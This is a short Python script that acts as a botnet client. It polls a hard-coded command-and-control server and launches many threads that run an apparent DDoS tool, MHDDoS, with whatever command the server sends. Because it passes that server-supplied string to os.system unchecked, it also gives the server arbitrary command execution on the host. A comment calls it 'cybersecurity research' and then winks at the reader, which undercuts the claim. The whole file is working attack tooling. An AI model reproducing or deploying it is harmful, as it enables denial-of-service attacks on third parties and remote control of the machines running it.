import threading
import os
import time
import json
import httpx

# Cybersecurity research, not used for malicious intent
# (As you can tell by the code, 😏)

server = "http://38.242.215.227:9600"
inAttack = False


def startThread(command, starttime, timeout):
    while True:
        if time.time() - starttime > timeout:
            break

        if inAttack == False:
            break

        os.system("python3 MHDDoS-2.4/start.py " + command)


while True:
    try:
        with httpx.Client() as client:
            response = client.get(server + "/")

        data = json.loads(response.text)

        command = data["command"]

        if command == "stop":
            inAttack = False
            time.sleep(2)
            continue

        if inAttack == True:
            time.sleep(2)
            continue

        if command == None:
            time.sleep(2)
            continue

        starttime = time.time()
        timeout = data["timeout"]
        amount = data["amount"]

        inAttack = True

        for x in range(amount):
            blehh = threading.Thread(
                target=startThread,
                args=(
                    command,
                    starttime,
                    timeout,
                ),
            )
            blehh.daemon = True
            blehh.start()

    except Exception as e:
        time.sleep(2)
